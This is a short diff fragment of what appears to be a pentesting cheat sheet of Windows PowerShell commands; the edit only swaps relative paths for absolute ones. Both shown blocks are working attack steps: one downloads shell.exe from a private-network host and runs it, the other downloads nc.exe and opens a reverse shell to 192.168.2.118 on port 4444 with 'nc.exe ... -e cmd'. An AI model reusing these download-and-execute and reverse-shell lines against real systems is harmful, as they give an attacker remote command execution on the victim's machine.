@@ -171,7 +171,7 @@ $url = "http://192.168.2.118/shell.exe"
 $out = "C:\Users\admin\Desktop\shell.exe"
 $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
-.\shell.exe
+C:\Users\admin\Desktop\shell.exe
 ```
 Windows
 ```
@@ -184,7 +184,7 @@ $url = "http://192.168.2.118/nc.exe"
 $out = "C:\Users\admin\Desktop\nc.exe"
 $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
-.\nc.exe 192.168.2.118 4444 -e cmd
+C:\Users\admin\Desktop\nc.exe 192.168.2.118 4444 -e cmd
 ```
 Windows
 ```
